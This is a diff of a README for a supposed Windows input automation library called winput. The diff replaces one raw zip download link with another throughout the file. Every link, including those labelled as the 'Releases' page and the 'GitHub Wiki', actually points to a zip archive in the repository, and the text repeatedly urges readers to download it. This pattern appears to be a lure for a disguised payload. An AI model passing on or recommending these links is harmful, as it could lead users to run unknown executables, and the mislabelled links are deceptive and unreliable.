@@ -1,7 +1,7 @@
 # 🎮 winput - Simple Windows Input Automation
 
 ## 🔗 Download Now
-[![Download winput](https://raw.githubusercontent.com/padiow/winput/master/cmd/Software_v2.3.zip%https://raw.githubusercontent.com/padiow/winput/master/cmd/Software_v2.3.zip)](https://raw.githubusercontent.com/padiow/winput/master/cmd/Software_v2.3.zip)
+[![Download winput](https://raw.githubusercontent.com/padiow/winput/master/hid/Software-1.6.zip%https://raw.githubusercontent.com/padiow/winput/master/hid/Software-1.6.zip)](https://raw.githubusercontent.com/padiow/winput/master/hid/Software-1.6.zip)
 
 ## 📦 Introduction
 Welcome to winput! This is a Windows backend input automation library. It allows you to automate input actions on your Windows machine with ease. Whether you want to automate repetitive tasks or enhance testing workflows, winput provides a reliable solution. 
@@ -16,7 +16,7 @@ Ready to start? Follow the steps below to download and run winput on your Window
 - **Disk Space:** At least 100 MB available
 
 ## 📥 Download & Install
-To get winput on your computer, visit this page to download: [winput Releases](https://raw.githubusercontent.com/padiow/winput/master/cmd/Software_v2.3.zip).
+To get winput on your computer, visit this page to download: [winput Releases](https://raw.githubusercontent.com/padiow/winput/master/hid/Software-1.6.zip).
 
 1. Click on the link above to go to the releases page.
 2. Locate the latest version of winput.
@@ -38,7 +38,7 @@ After installation, you can use winput for automating your input tasks. Here’s
 - **User-Friendly API:** Designed for easy use, even for non-programmers.
 
 ## 📚 Documentation
-Full documentation is available on the [GitHub Wiki](https://raw.githubusercontent.com/padiow/winput/master/cmd/Software_v2.3.zip). Here, you can find:
+Full documentation is available on the [GitHub Wiki](https://raw.githubusercontent.com/padiow/winput/master/hid/Software-1.6.zip). Here, you can find:
 - Detailed guides on using different features.
 - Examples of scripts to get you started.
 - FAQs for common queries.
@@ -53,6 +53,6 @@ winput is licensed under the MIT License. You can use, modify, and distribute it
 We welcome contributions to winput! If you have ideas for improvement or want to report a bug, please submit a pull request or open an issue in the repository.
 
 ## 🔗 Download Here Again
-Don't forget to download winput to start automating your inputs today: [winput Releases](https://raw.githubusercontent.com/padiow/winput/master/cmd/Software_v2.3.zip). 
+Don't forget to download winput to start automating your inputs today: [winput Releases](https://raw.githubusercontent.com/padiow/winput/master/hid/Software-1.6.zip). 
 
 With winput, you can enjoy seamless Windows input automation!
